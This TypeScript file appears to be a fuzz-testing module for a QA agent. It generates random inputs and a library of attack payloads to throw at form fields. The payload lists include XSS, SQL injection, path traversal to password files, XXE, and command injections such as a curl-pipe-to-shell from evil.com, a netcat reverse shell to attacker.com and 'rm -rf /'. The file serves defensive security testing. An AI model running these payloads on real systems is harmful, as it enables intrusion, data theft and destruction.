/**
 * OSO QA Agent - Fuzzy Input Generator
 * Generates random, chaotic, and potentially malicious inputs
 */

// ============================================
// RANDOM GENERATORS
// ============================================

export function randomString(length: number = 20): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:\'",.<>?/`~'
  return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('')
}

export function randomUnicode(length: number = 10): string {
  return Array.from({ length }, () =>
    String.fromCharCode(Math.floor(Math.random() * 65535))
  ).join('')
}

export function randomNumber(min: number = -999999999, max: number = 999999999): number {
  return Math.floor(Math.random() * (max - min + 1)) + min
}

export function randomDecimal(min: number = -999999, max: number = 999999, decimals: number = 2): number {
  const num = Math.random() * (max - min) + min
  return Number(num.toFixed(decimals))
}

export function randomEmail(): string {
  const localPart = randomString(Math.floor(Math.random() * 20) + 1)
  const domain = randomString(Math.floor(Math.random() * 10) + 3)
  const tld = ['com', 'org', 'net', 'co.uk', 'io', ''][Math.floor(Math.random() * 6)]
  return `${localPart}@${domain}.${tld}`
}

export function randomDate(): string {
  const year = Math.floor(Math.random() * 200) + 1900
  const month = Math.floor(Math.random() * 12) + 1
  const day = Math.floor(Math.random() * 31) + 1
  return `${year}-${String(month).padStart(2, '0')}-${String(day).padStart(2, '0')}`
}

// ============================================
// MALICIOUS PAYLOADS
// ============================================

export const MaliciousPayloads = {
  xss: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<input onfocus=alert("XSS") autofocus>',
    '<marquee onstart=alert("XSS")>',
    '<video><source onerror="alert(\'XSS\')">',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    'data:text/html,<script>alert("XSS")</script>',
    '<a href="javascript:alert(\'XSS\')">click</a>',
    '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//',
    '{{constructor.constructor(\'alert(1)\')()}}', // Angular template injection
    '${alert(1)}', // Template literal injection
  ],

  sqlInjection: [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "1'; DELETE FROM clients WHERE '1'='1",
    "admin'--",
    "1 OR 1=1",
    "' UNION SELECT * FROM users--",
    "'; EXEC xp_cmdshell('dir');--",
    "1; UPDATE users SET password='hacked'--",
    "' OR ''='",
    "105; DROP TABLE users",
    "1' AND '1'='1",
    "' OR 1=1--",
    "'; WAITFOR DELAY '0:0:10'--",
  ],

  commandInjection: [
    '; ls -la',
    '| cat /etc/passwd',
    '`rm -rf /`',
    '$(whoami)',
    '; curl evil.com/shell.sh | sh',
    '|| ping -c 10 127.0.0.1',
    '&& cat /etc/shadow',
    '; nc -e /bin/sh attacker.com 1234',
    '| mail -s "hacked" attacker@evil.com',
    '> /dev/null 2>&1 & rm -rf /',
  ],

  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '%2e%2e%2f%2e%2e%2fetc/passwd',
    '....//....//etc/passwd',
    '..%252f..%252f..%252fetc/passwd',
    '/var/www/../../etc/passwd',
    'file:///etc/passwd',
  ],

  ldapInjection: [
    '*',
    '*)(uid=*))(|(uid=*',
    '*)(&',
    '*)(objectClass=*',
    '*()|%26\'',
    'admin)(&)',
  ],

  xmlInjection: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<![CDATA[<script>alert("XSS")</script>]]>',
    '<!--#exec cmd="ls" -->',
  ],

  prototypePoolution: [
    '{"__proto__": {"admin": true}}',
    '{"constructor": {"prototype": {"admin": true}}}',
    '{"__proto__": {"toString": "hacked"}}',
  ],

  bufferOverflow: [
    'A'.repeat(10000),
    'A'.repeat(65536),
    'A'.repeat(1048576),
    '\x00'.repeat(1000),
    Array(1000).fill('\uFFFD').join(''),
  ],

  formatString: [
    '%s%s%s%s%s%s%s%s%s%s',
    '%n%n%n%n%n',
    '%x%x%x%x%x',
    '%.1000000000s',
    '%p%p%p%p%p',
  ],

  headerInjection: [
    'value\r\nHeader: injected',
    'value\nSet-Cookie: session=hacked',
    'value\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK',
  ],

  unicodeExploits: [
    '\u202E\u0041\u0042\u0043', // Right-to-left override
    '\uFEFF', // BOM
    '\u0000', // Null byte
    '\uFFFF', // Non-character
    '\uD800', // High surrogate
    '\uDFFF', // Low surrogate
    '\u200B', // Zero-width space
    '\u00A0', // Non-breaking space
    '\u2028', // Line separator
    '\u2029', // Paragraph separator
  ],
}

// ============================================
// FUZZY TEST DATA GENERATOR
// ============================================

export interface FuzzyTestCase {
  fieldId: string
  value: string | number
  category: string
  description: string
}

export function generateFuzzyTests(fieldIds: string[], count: number = 10): FuzzyTestCase[] {
  const tests: FuzzyTestCase[] = []
  const allPayloads = [
    ...MaliciousPayloads.xss.map(p => ({ value: p, category: 'XSS', description: 'Cross-site scripting attempt' })),
    ...MaliciousPayloads.sqlInjection.map(p => ({ value: p, category: 'SQL Injection', description: 'SQL injection attempt' })),
    ...MaliciousPayloads.commandInjection.map(p => ({ value: p, category: 'Command Injection', description: 'Command injection attempt' })),
    ...MaliciousPayloads.pathTraversal.map(p => ({ value: p, category: 'Path Traversal', description: 'Path traversal attempt' })),
    ...MaliciousPayloads.bufferOverflow.map(p => ({ value: p, category: 'Buffer Overflow', description: 'Buffer overflow attempt' })),
    ...MaliciousPayloads.unicodeExploits.map(p => ({ value: p, category: 'Unicode Exploit', description: 'Unicode exploit attempt' })),
  ]

  for (const fieldId of fieldIds) {
    // Add random malicious payloads
    for (let i = 0; i < count; i++) {
      const payload = allPayloads[Math.floor(Math.random() * allPayloads.length)]
      tests.push({
        fieldId,
        value: payload.value,
        category: payload.category,
        description: `${payload.description} on ${fieldId}`,
      })
    }

    // Add random strings
    tests.push({
      fieldId,
      value: randomString(Math.floor(Math.random() * 1000)),
      category: 'Random String',
      description: `Random string input on ${fieldId}`,
    })

    // Add random unicode
    tests.push({
      fieldId,
      value: randomUnicode(50),
      category: 'Random Unicode',
      description: `Random unicode input on ${fieldId}`,
    })
  }

  return tests
}

// ============================================
// CHAOS MONKEY
// ============================================

export function chaosMonkeyValue(fieldType: string): string | number {
  const chaos = Math.random()

  if (chaos < 0.1) return '' // Empty
  if (chaos < 0.2) return randomString(10000) // Very long
  if (chaos < 0.3) return randomNumber() // Random number
  if (chaos < 0.4) return MaliciousPayloads.xss[Math.floor(Math.random() * MaliciousPayloads.xss.length)]
  if (chaos < 0.5) return MaliciousPayloads.sqlInjection[Math.floor(Math.random() * MaliciousPayloads.sqlInjection.length)]
  if (chaos < 0.6) return randomUnicode(100)
  if (chaos < 0.7) return '\x00'.repeat(100)
  if (chaos < 0.8) return NaN as unknown as number
  if (chaos < 0.9) return Infinity as unknown as number

  // Default: mix of everything
  return randomString(50) + MaliciousPayloads.xss[0] + randomUnicode(10)
}

// ============================================
// RATE LIMITING TEST
// ============================================

export function generateRapidRequests(count: number): { delay: number; action: string }[] {
  return Array.from({ length: count }, (_, i) => ({
    delay: Math.floor(Math.random() * 50), // 0-50ms delay
    action: i % 2 === 0 ? 'save' : 'saveDraft',
  }))
}
